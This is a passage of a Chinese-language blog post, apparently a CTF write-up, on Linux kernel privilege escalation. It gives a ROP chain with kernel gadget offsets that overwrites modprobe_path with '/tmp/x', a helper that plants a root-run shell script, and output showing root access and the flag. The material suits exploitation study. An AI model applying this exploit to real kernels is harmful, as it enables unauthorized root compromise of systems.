+    --&gt; commit_creds: ffffffffb2a
+<span class="o">[</span>*<span class="o">]</span> Prepared leak_prepare_kernel_
+    --&gt; prepare_kernel_cred: ffff
+<span class="o">[</span>*<span class="o">]</span> Prepared call_prepare_kernel_
+<span class="o">[</span>*<span class="o">]</span> get cred
+<span class="o">[</span>*<span class="o">]</span> Prepared call_commit_creds pa
+<span class="o">[</span>*<span class="o">]</span> Returned to userland
+<span class="o">[</span>*<span class="o">]</span> UID: 0, got root!
+/ <span class="c1"># id</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span>
+/ <span class="c1"># cat /dev/sda</span>
+hxp<span class="o">{</span>t0p_d3feNSeS_Vs_1337_h@ck3rs<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="technique-overwriting-modprobe_path">Technique: Overwriting modprobe_path</h2>
+<blockquote>
+<p><strong>什么是<code>modprobe</code>?</strong></p>
+<p>“<code>modprobe</code> is a Linux program originally written by Rusty Russell and used to add a loadable kernel module to the Linux kernel or to remove a loadable kernel module from the kernel”</p>
+<p>当我们安装或卸载一个内核模块时，<code>modprobe</code>就会被执行。而其默认路径<code>modprobe_path</code>就是<code>/sbin/modprobe</code></p>
+</blockquote>
+<p>可以通过以下命令查看：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/ <span class="c1"># cat /proc/sys/kernel/modprobe</span>
+/sbin/modprobe
+</code></pre></td></tr></table>
+</div>
+</div><p><code>modprobe_path</code>是一个全局变量，这意味着，我们可以通过<code>/proc/kallsyms</code>得到它。</p>
+<p>当我们执行一个未知类型的文件，<code>modprobe_path</code>指向的文件就会被执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span> <span class="nf">call_modprobe</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">module_name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">wait</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;-q&#34;</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;--&#34;</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">module_name</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  	<span class="n">info</span> <span class="o">=</span> <span class="n">call_usermodehelper_setup</span><span class="p">(</span><span class="n">modprobe_path</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span>
+					 <span class="nb">NULL</span><span class="p">,</span> <span class="n">free_modprobe_argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>如果，将路径覆盖指向我们编写的shell脚本，就实现了以root权限执行任意脚本的目的。</p>
+<h3 id="leak-modprobe_path">Leak modprobe_path</h3>
+<p>第一步，首先泄露地址。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">canary</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">38</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0xa157ULL</span><span class="p">;</span>
+    <span class="n">kpti_pass</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x200f10ULL</span> <span class="o">+</span> <span class="mi">22ULL</span><span class="p">;</span>
+    <span class="n">pop_rax</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x4d11ULL</span><span class="p">;</span>
+    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x6370ULL</span><span class="p">;</span>
+    <span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x7616ULL</span><span class="p">;</span>
+    <span class="n">pop_rbx</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x6158ULL</span><span class="p">;</span>
+    <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xf8d4fcULL</span><span class="p">;</span>
+    <span class="n">ksymtab_commit_creds</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xf87d90ULL</span><span class="p">;</span>
+    <span class="n">read_mrax_pop</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x15a7fULL</span><span class="p">;</span>
+    <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x1061820ULL</span><span class="p">;</span>
+    <span class="n">write_mrbx_rax_pop2</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x306dULL</span><span class="p">;</span>
+<span class="c1">//0xffffffff8100306d : mov qword ptr [rbx], rax ; pop rbx ; pop rbp ; ret
+</span></code></pre></td></tr></table>
+</div>
+</div><p>与之前的并没有太大差别。这次要写内存，所以要找一个新<code>gadget</code></p>
+<h3 id="overwrite">Overwrite</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rax</span><span class="p">;</span>             <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x782f706d742f</span><span class="p">;</span> 	<span class="c1">// rax &lt;- &#34;/tmp/x&#34;;   
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rbx</span><span class="p">;</span> 
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>              
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">write_mrbx_rax_pop2</span><span class="p">;</span>   <span class="c1">// [rbx] &lt;-- rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">//dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> 
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_pass</span><span class="p">;</span> <span class="c1">// swwapgs_restore_regs_and_return_to_usermode
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>           <span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>           <span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_flag</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>下一步，我们要让创建一个未知类型的文件，让系统执行，这样系统就会去执行我们的<code>/tmp/x</code>。所以我们的脚本要读出<code>flag</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">get_flag</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Returned to userland, setting up for fake modprobe&#34;</span><span class="p">);</span>
+    
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo &#39;#!/bin/sh</span><span class="se">\n</span><span class="s">cp /dev/sda /tmp/flag</span><span class="se">\n</span><span class="s">chmod 777 /tmp/flag&#39; &gt; /tmp/x&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/x&#34;</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff&#39; &gt; /tmp/dummy&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/dummy&#34;</span><span class="p">);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Run unknown file&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Hopefully flag is readable&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cat /tmp/flag&#34;</span><span class="p">);</span>
+
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="get-flag-">Get flag !</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="o">/</span> <span class="err">$</span> <span class="n">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span>
+<span class="o">/</span> <span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span> 
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">state</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opened</span> <span class="n">device</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Leaked</span> <span class="mi">320</span> <span class="n">bytes</span>
+    <span class="o">--&gt;</span> <span class="nl">Cookie</span><span class="p">:</span> <span class="mi">3</span><span class="n">c8fec292491ab00</span>
+    <span class="o">--&gt;</span> <span class="n">Image</span> <span class="nl">base</span><span class="p">:</span> <span class="n">ffffffff8c800000</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Prepared</span> <span class="n">leak_commit_creds</span> <span class="n">payload</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Returned</span> <span class="n">to</span> <span class="n">userland</span><span class="p">,</span> <span class="n">setting</span> <span class="n">up</span> <span class="k">for</span> <span class="n">fake</span> <span class="n">modprobe</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Run</span> <span class="n">unknown</span> <span class="n">file</span>
+<span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nl">dummy</span><span class="p">:</span> <span class="n">line</span> <span class="mi">1</span><span class="o">:</span> <span class="err">����</span><span class="o">:</span> <span class="n">not</span> <span class="n">found</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Hopefully</span> <span class="n">flag</span> <span class="n">is</span> <span class="n">readable</span>
+<span class="n">hxp</span><span class="p">{</span><span class="n">t0p_d3feNSeS_Vs_1337_h</span><span class="err">@</span><span class="n">ck3rs</span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-08-22</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/pwn/">Pwn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/musl-libc-pwn-learning/" class="prev" rel="prev" title="Musl Libc Pwn Learning"><i class="fas fa-angle-left fa-fw"></i>Musl Libc Pwn Learning</a>
+            <a href="/posts/cpp-exploitation-basic/" class="next" rel="next" title="C&#43;&#43; Exploitation Basic">C&#43;&#43; Exploitation Basic<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Niebelungen</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
